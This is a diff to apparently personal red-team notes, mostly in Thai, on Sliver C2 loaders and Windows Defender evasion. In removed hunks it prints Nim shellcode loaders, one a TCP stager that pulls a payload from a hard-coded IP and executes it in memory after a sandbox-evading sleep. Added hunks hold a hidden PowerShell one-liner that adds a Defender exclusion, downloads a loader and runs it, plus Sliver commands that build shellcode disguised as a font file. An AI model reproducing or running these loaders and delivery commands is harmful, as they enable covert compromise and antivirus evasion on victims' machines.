@@ -4,7 +4,7 @@
 1. [Sliver Architecture](#1-sliver-architecture)
 2. [Shellcode Injection Logic](#2-shellcode-injection-logic)
 3. [VirtualAllocEx & Memory Protection](#3-virtualallocex--memory-protection)
-4. [Loader Versions ที่ทดสอบ](#4-loader-versions-ที่ทดสอบ)
+4. [Go Loader (ตัวหลัก)](#4-go-loader-ตัวหลัก)
 5. [EDR vs AV — จับคนละชั้น](#5-edr-vs-av--จับคนละชั้น)
 6. [UAC Bypass](#6-uac-bypass)
 7. [Persistence Techniques](#7-persistence-techniques)
@@ -96,109 +96,7 @@ VirtualAllocEx  = จอง memory ใน process ไหนก็ได้
 
 ---
 
-## 4. Loader Versions ที่ทดสอบ
-
-### v1 — Original (โดน Defender)
-
-```nim
-# จอง RWX ตรงๆ
-let rPtr = VirtualAllocEx(pHandle, NULL, size, 0x3000, PAGE_EXECUTE_READ_WRITE)
-copyMem(rPtr, addr shellcode[0], len(shellcode))
-let f = cast[proc()](rPtr)
-f()
-```
-
-ผล: **Defender จับ** — RWX + known API pattern
-
-### v2 — HTTP Loader (หลบ Defender ได้)
-
-```nim
-# จอง RW ก่อน
-let rPtr = VirtualAlloc(NULL, size, 0x3000, PAGE_READWRITE)
-copyMem(rPtr, addr shellcode[0], len(shellcode))
-
-# เปลี่ยนเป็น RX
-VirtualProtect(rPtr, size, PAGE_EXECUTE_READ, addr oldProtect)
-
-# Sleep หลบ sandbox
-Sleep(10000)
-
-# Execute
-let f = cast[proc()](rPtr)
-f()
-```
-
-ผล: **หลบ Defender ได้** แต่ shellcode 33MB โหลดช้ามาก
-
-### v3 — TCP Stager (ตัวสุดท้ายที่ใช้ ✅)
-
-```nim
-import winim/lean
-import net
-
-proc main(): void =
-  Sleep(10000)
-
-  # Connect ตรงไป Sliver stage-listener
-  var sock = newSocket()
-  sock.connect("100.103.4.93", Port(8444))
-
-  # Read 4-byte size header
-  var sizeData = sock.recv(4)
-  var size: uint32
-  copyMem(addr size, addr sizeData[0], 4)
-
-  # Read payload
-  var shellcode: string = ""
-  while shellcode.len.uint32 < size:
-    var chunk = sock.recv(4096)
-    if chunk.len == 0: break
-    shellcode.add(chunk)
-  sock.close()
-
-  # Allocate RW → Write → Change to RX → Execute
-  let rPtr = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), 0x3000, PAGE_READWRITE)
-  copyMem(rPtr, addr shellcode[0], shellcode.len)
-  var oldProtect: DWORD
-  VirtualProtect(rPtr, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, addr oldProtect)
-  let f = cast[proc() {.nimcall.}](rPtr)
-  f()
-```
-
-ผล: **หลบ Defender + ได้ session สำเร็จ** ✅
-
-ข้อดีเทียบ v2:
-- ไม่ต้องเปิด HTTP server แยก
-- ไม่ต้องโหลดไฟล์ 33MB (Sliver ส่ง implant ให้ผ่าน TCP)
-- exe เล็กกว่า (414KB vs 495KB)
-
-### Delivery Method ที่ใช้
-
-```
-Win+R → powershell -w hidden -enc [base64]
-  → โหลด loader_v2.exe จาก HTTP
-  → เซฟเป็น svc.exe
-  → รัน
-
-Sliver setup:
-  mtls -l 4443
-  profiles new --mtls IP:4443 --os windows --arch amd64 --format shellcode default
-  stage-listener --url tcp://IP:8444 --profile default
-```
-
-### สิ่งที่เรียนรู้
-
-```
-ขั้นตอน                        ผลลัพธ์
-1. Keyboard macro พิมพ์เร็ว     ✅ ไม่โดน flag
-2. powershell -enc download     ✅ ผ่าน
-3. Loader v1 (RWX) รัน         ❌ Defender จับ
-4. Loader v2 HTTP (RW→RX)      ✅ ผ่าน Defender แต่ช้า (33MB)
-5. Loader v3 TCP Stager        ✅ ผ่าน Defender + session สำเร็จ
-6. Python ctypes loader        ✅ BYOE หลบ AV ได้ดี
-```
-
-### v4 — Go Loader + Garble (Advanced)
+## 4. Go Loader (ตัวหลัก)
 
 ```
 Flow: AMSI bypass → ETW patch → Unhook ntdll → Fetch shellcode → Execute
@@ -233,6 +131,19 @@ garble ไม่ทำ:
 - behavioral pattern (API call sequence) เหมือนเดิม
 
 Source: `https://github.com/poomiput/playtest`
+
+### Delivery
+
+```
+Win+R → powershell -w hidden -c "Add-MpPreference -ExclusionPath $env:TEMP; iwr https://raw.githubusercontent.com/poomiput/playtest/main/loader.exe -o $env:TEMP\loader.exe; Start-Process $env:TEMP\loader.exe"
+```
+
+Sliver setup:
+```
+generate --mtls 100.103.4.93:4443 --os windows --arch amd64 --format shellcode --save /home/kali/Desktop/vt_test/update.woff2
+mtls -l 4443
+python3 -m http.server 9999   # serve update.woff2
+```
 
 ### Defender Exclusion Technique
 
@@ -520,14 +431,8 @@ portfwd add -r [ip:port], socks5 start, pivots
 
 ```
 ~/Desktop/vt_test/
-├── loader_v2.exe        (v3 TCP stager - ตัวหลักที่ใช้)
-├── loader_v2.nim        (v3 source)
-├── loader_http.exe      (v2 HTTP loader)
-├── loader_http.nim      (v2 source)
-├── loader.py            (Python ctypes loader - BYOE)
 ├── loader.exe           (Go loader + garble obfuscated)
 ├── update.woff2         (Sliver shellcode for Go loader)
-├── shellc.bin           (Sliver shellcode stageless)
 └── macro.txt            (encoded PowerShell commands)
 
 ~/Desktop/playtest/              (Git repo - Go loader source)
